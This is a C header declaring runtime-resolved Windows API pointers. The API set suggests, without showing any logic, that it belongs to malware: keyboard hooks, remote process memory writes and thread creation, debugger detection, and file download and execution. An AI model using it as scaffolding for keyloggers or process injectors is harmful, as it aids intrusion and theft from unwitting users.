#ifndef __API_H_FILE
#define __API_H_FILE

#include "windows.h"


//KERNEL32.DLL
void * (__stdcall *_GetProcAddress)(void *hDll, unsigned char *szFunction);
void * (__stdcall *_LoadLibraryA)(char *szDLL);
long (__stdcall *_StringCbPrintfA)(char *pszDest, unsigned long cbDest, char *pszFormat,...);
char * (__stdcall *_GetCommandLineA)(void);

int (__stdcall *_CreateProcessA)(char *lpApplicationName, char *lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, unsigned short bInheritHandles, int dwCreationFlags, void *lpEnvironment,char  *lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
int (__stdcall *_GetVolumeInformationA)(char *lpRootPathName, char *lpVolumeNameBuffer, unsigned long nVolumeNameSize, unsigned long *lpVolumeSerialNumber, unsigned long *lpMaximumComponentLength, unsigned long *lpFileSystemFlags, char *lpFileSystemNameBuffer, unsigned long nFileSystemNameSize);
unsigned int (__stdcall *_GetSystemDirectoryA)(unsigned char *lpBuffer, unsigned int uSize);
int (__stdcall *_GetUserNameExA)(EXTENDED_NAME_FORMAT NameFormat,char *lpNameBuffer, unsigned long *lpnSize);
int (__stdcall *_GetUserNameA)(unsigned char *lpBuffer, unsigned long *pcbBuffer);
void (__stdcall *_Sleep)(unsigned long dwMilliSeconds);
int (__stdcall *_GetComputerNameExA)(int NameType, unsigned char *lpBuffer, unsigned long *nSize);
unsigned long (__stdcall *_GetCurrentProcessId)(void);
void * (__stdcall *_GetCurrentProcess)(void);
int (__stdcall *_GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
int (__stdcall *_CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, unsigned long nSize);
int (__stdcall *_ReadFile)(void *hFile, void *lpBuffer, unsigned long nNumberOfBytesRead, unsigned long *lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
int (__stdcall *_WriteFile)(void *hFile, void *lpBuffer, unsigned long nNumberOfBytesToWrite, unsigned long *lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
int (__stdcall *_TerminateProcess)(void *hProcess, unsigned int uExitCode);
int (__stdcall *_CloseHandle)(void *hObject);
unsigned long (__stdcall *_WaitForSingleObject)(void *hHandle, unsigned long dwMilliseconds);
int (__stdcall *_FreeConsole)(void);
void *(__stdcall *_GetConsoleWindow)(void);
	
int (__stdcall *_CloseHandle)(void *hObject);
void (__stdcall *_GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
int (__stdcall *_PeekNamedPipe)(void *hNamedPipe, void *lpBuffer, unsigned long nBufferSize, unsigned long *lpBytesRead, unsigned long *lpTotalBytesAvail, unsigned long *lpBytesLeftThisMessage);
int (__stdcall *_GetExitCodeProcess)(void *hProcess, unsigned long *lpExitCode);
int (__stdcall *_SetHandleInformation)(void *hObject, unsigned long dwMask, unsigned long dwFlags);
void * (__stdcall *_CreateThread)(SECURITY_ATTRIBUTES *lpThreadAttributes, unsigned long dwStackSize, PTHREAD_START_ROUTINE *lpStartAddress, void *lpParameter, unsigned long dwCreateFlags, unsigned long *lpThreadId);
int (__stdcall *_TerminateThread)(void *hThread, unsigned long dwExitCode);
int (__stdcall *_WideCharToMultiByte)(unsigned int CodePage, unsigned long dwFlags, wchar_t *lpWideCarStr, int cchWideChar, char *lpMultiByteStr, int cbMultiByte, char *lpDefaultChar, int *lpUsedDefaultChar);
void (__stdcall *_SetFileApisToANSI)(void);
void *(__stdcall *_VirtualAlloc)(void *lpAddress, unsigned long dwSize, unsigned long flAllocationType, unsigned long flProtect);
int (__stdcall *_VirtualFree)(void *lpAddress, unsigned long dwSize, unsigned long dwFreeType);

int (__stdcall *_lstrlenA)(char *lpString);
int (__stdcall *_lstrcpynA)(char *szDest, char *szSource, int dwLength);
int (__stdcall *_lstrcpyA)(char *szDest, char *szSource);
int (__stdcall *_lstrcatA)(char *szDest, char *szSource);
int (__stdcall *_lstrcmpiA)(char *szString, char *szString2);

void (__stdcall *_ZeroMemory)(void *Buffer, unsigned long dwLength);
void * (__stdcall *_GetProcessHeap)(void);
void * (__stdcall *_HeapAlloc)(void *hHeap, unsigned long dwFlags, unsigned long dwBytes);
int (__stdcall *_HeapFree)(void *hHeap, unsigned long dwFlags, void *lpMem);
void * (__stdcall *_LocalAlloc)(unsigned int uFlags, unsigned long uBytes);
void * (__stdcall *_LocalFree)(void *hLocal);

void * (__stdcall *_OpenProcess)(unsigned long dwDesiredAccess, char bInheritHandle, unsigned long dwProcessId);
void * (__stdcall *_OpenThread)(unsigned long dwDesiredAccess, char bInheritHandle, unsigned long dwThreadId);

unsigned long (__stdcall *_GetProcessId)(void *hProcess);

unsigned long (__stdcall *_ExitProcess)(unsigned long ExitCode);
void (__stdcall *_ExitThread)(unsigned long dwExitCode);
int (__stdcall *_SetConsoleCtrlHandler)(PHANDLER_ROUTINE HandlerRoutine,int Add);
int (__stdcall *_CheckRemoteDebuggerPresent)(void *hProcess, int *pbDebuggerPresent);
void *(__stdcall *_GetModuleHandleA)(char *lpModuleName);
unsigned long (__stdcall *_GetModuleFileNameA)(void *hModule, char *lpFilename, unsigned long nSize);
void *(__stdcall *_VirtualAllocEx)(void *hProcess, void *lpAddress, unsigned long dwSize, unsigned long flAllocationType, unsigned long flProtect);
int (__stdcall *_VirtualFreeEx)(void *hProcess, void *lpAddress, unsigned long dwSize, unsigned long dwFreeType);
unsigned int (__stdcall *_GetWindowsDirectoryA)(unsigned char *lpBuffer, unsigned int uSize);
int (__stdcall *_CopyFileA)(char *lpExistingFileName, char *lpNewFileName, int bFailIfExists);
unsigned long (__stdcall *_GetTempPathA)(unsigned long nBufferLength, char *lpBuffer);
unsigned long (__stdcall *_GetLastError)(void);

//CRYPT32.DLL
unsigned short (__stdcall *_CryptBinaryToStringA)(const unsigned char *pbBinary, unsigned long cbBinary, unsigned long dwFlags, char *szString, unsigned long *pcchString);
unsigned short (__stdcall *_CryptStringToBinaryA)(char *szString, unsigned long cchString,  unsigned long dwFlags, char *pbBinary, unsigned long *pcbBinary, unsigned long *pdwSkip, unsigned long *pdwFlags);

//USER32.DLL
unsigned long (__stdcall *_MessageBoxA)(void *HWND, unsigned char *szText, unsigned char *szCaption, unsigned long dwOption);
void * (__stdcall *_GetForegroundWindow)(void);
int (__stdcall *_ShowWindow)(void *hWnd, int nCmdShow);
void *(__stdcall *_GetFocus)(void);
HHOOK (__stdcall *_SetWindowsHookExA)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
int (__stdcall *_GetMessageA)(MSG *lpMsg, HWND hWnd, unsigned int wMsgFilterMin, unsigned int wMsgFilterMax);
int (__stdcall *_TranslateMessage)(const MSG *lpMsg);
LRESULT (__stdcall *_DispatchMessageA)(const MSG *lpMsg);
short (__stdcall *_GetKeyState)(int nVirtKey);
LRESULT (__stdcall *_CallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);


//WININET.DLL
void * (__stdcall *_InternetOpenA)(unsigned char *lpszAgent, unsigned long dwAccessType, unsigned char *lpszProxy, unsigned char *lpszProxyBypass, unsigned long dwFlags);
void * (__stdcall *_InternetConnectA)(void *hInternet, unsigned char *lpszServerName, unsigned short nServerPort, unsigned char *lpszUserName, unsigned char *lpszPassword, unsigned long dwService, unsigned long dwFlags, unsigned long dwContext);
void * (__stdcall *_HttpOpenRequestA)(void * hConnect, unsigned char *lpszVerb, unsigned char *lpszObjectName, unsigned char *lpszVersion, unsigned char *lpszReferer, unsigned char *lplpszAcceptTypes, unsigned long dwFlags, unsigned long dwContext);
unsigned short (__stdcall *_InternetReadFile)(void *hFile, void *lpBuffer, unsigned long dwNumberOfBytesToRead, unsigned long *lpdwNumberOfBytesRead);
unsigned short (__stdcall *_InternetCloseHandle)(void *hInternet);
int (__stdcall *_HttpSendRequestA)(void *hRequest, unsigned char *lpszHeaders, unsigned long dwHeadersLength, void *lpOptional, unsigned long dwOptionalLength);


//URLMON.DLL
unsigned long (__stdcall *_URLDownloadToFileA)(void *, char *, char *, unsigned long, void *);


//SHWLAPI.DLL
int (__stdcall *_PathFileExistsA)(char *pszPath);

//SHELL32.DLL
void * (__stdcall *_ShellExecuteA)(void *hwnd, char *lpOperation, char *lpFile, char *lpParameters, char *lpDirectory, int nShowCmd);


//ADVAPI32.DLL
int (__stdcall *_InitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecuirtyDescriptor, unsigned long dwRevision);
int (__stdcall *_SetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR pSecuirtyDescriptor, int bDaclPresent, PACL pDacl, int bDaclDefaulted);
int (__stdcall *_CryptAcquireContextA)(unsigned long  *phProv,char *szContainer,char *szProvider,unsigned long dwProvType,unsigned long dwFlags);
int (__stdcall *_CryptCreateHash)(unsigned long hProv, unsigned int Algid, unsigned long hKey, unsigned long dwFlags, unsigned long *phHash); 
int (__stdcall *_CryptHashData)(unsigned long  hHash, char *pbData,unsigned long dwDataLen,unsigned long dwFlags);
int (__stdcall *_CryptGetHashParam)(unsigned long hHash,unsigned long dwParam,char *pbData,unsigned long *pdwDataLen, unsigned long dwFlags);
int (__stdcall *_CryptDestroyHash)(unsigned long hHash);
int (__stdcall *_CryptReleaseContext)(unsigned long hProv,unsigned long dwFlags);
int (__stdcall *_GetComputerNameA)(unsigned char *lpBuffer, unsigned long *pcbBuffer);
long (__stdcall *_RegCreateKeyExA)(HKEY hKey,char *lpSubKey,unsigned long Reserved,char *lpClass,unsigned long dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,unsigned long *lpdwDisposition);
long (__stdcall *_RegSetValueExA)(HKEY hKey, char *lpValueName,unsigned long Reserved,unsigned long dwType,const unsigned char* lpData,unsigned long cbData);

//MSVCRT.DLL
FILE * (__cdecl *_crt_popen)(char *_Command, char *_Mode);
int (__cdecl *_crt_pclose)(FILE *_File);
unsigned long (__cdecl *_crt_fread)(void *_DstBuf, unsigned long _ElementSize, unsigned long _Count, FILE *_File);
char * (__cdecl *_getenv)(const char *var);
int (__cdecl *_snprintf)(char *dest, int size, char *format, ...); // ESTA
int (__cdecl *_printf)(char *format, ...); //quitar 
int (__cdecl *_atoi)(char *str); // comprobar 
int (__cdecl *_toupper)(int chr); // comprobar

//NTDLL.DLL
long (__stdcall *_ZwSetInformationProcess)(void *hProcess,unsigned long ProcessInfoClass,void *ProcessInfo,unsigned long ProcessInfoLength);
long (__stdcall *_NtQueryInformationProcess)(void *hProcess, PROCESSINFOCLASS ProcessInformationClass, void *ProcessInformation, unsigned long ProcessInformationLength, unsigned long *ReturnLength);
long (__stdcall *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, void *SystemInformation, unsigned long SystemInformationLength, unsigned long *ReturnLength);
int (__stdcall *_NtTerminateProcess)(void *hProcess, unsigned long nt_status);
long (__stdcall *_RtlCreateUserThread)(void *hProcess, PSECURITY_DESCRIPTOR SecurityDescriptor,int CreateSuspend, unsigned long StackZeroBits, unsigned long *stackReserved, unsigned long *stackCommit, void *startAddress, void *startParams, void *hThread, PCLIENT_ID clientID);
long (__stdcall *_RtlAdjustPrivilege)(unsigned long Privilege,int Enable,int CurrentThread,int *Enabled);
PIMAGE_NT_HEADERS (__stdcall *_RtlImageNtHeader)(void *memOffset);
long (__stdcall *_NtOpenProcess)(void *hProcess, ACCESS_MASK mask, 	POBJECT_ATTRIBUTES  pObjAttr, PCLIENT_ID clientID);
long (__stdcall *_NtWriteVirtualMemory)(void *ProcessHandle,void *BaseAddress, void *Buffer, unsigned long NumberOfBytesToWrite,unsigned long *NumberOfBytesWritten);
long (__stdcall *_NtClose)(void *hHandle);
long (__stdcall *_NtWaitForSingleObject)(void *hHandle, int Alertable, LONGLONG *pTimeout);
long (__stdcall *_NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass,void *SystemInformation,unsigned long SystemInformationLength,unsigned long *ReturnLength);


/*
#define getNTSTATUS(val) \
	__asm mov ebx, eax \
	__asm mov val, ebx \
*/

#endif
